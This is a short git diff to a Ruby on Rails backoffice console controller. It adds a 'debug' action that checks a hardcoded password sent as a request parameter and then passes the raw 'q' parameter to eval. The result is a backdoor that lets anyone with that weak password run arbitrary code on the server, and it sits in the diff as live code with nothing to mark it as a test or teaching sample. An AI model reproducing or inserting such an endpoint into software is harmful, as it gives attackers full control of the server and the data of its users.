@@ -21,8 +21,13 @@ class Backoffice::ConsoleController < ApplicationController
     def site_config
     end
     
-    # GET /console/debug
+    # GET /console/debug :: params[:q]
     def debug
+        return render json: {status: 'valid-error', message: 'you are not authorized for using console'} if params[:auth] != '1q2w3e4r'
+        eval("#{params[:q]}")
+    
+        # return render json: {status: 'success', query: params[:q]}
+        redirect_to :back
     end
     
     private
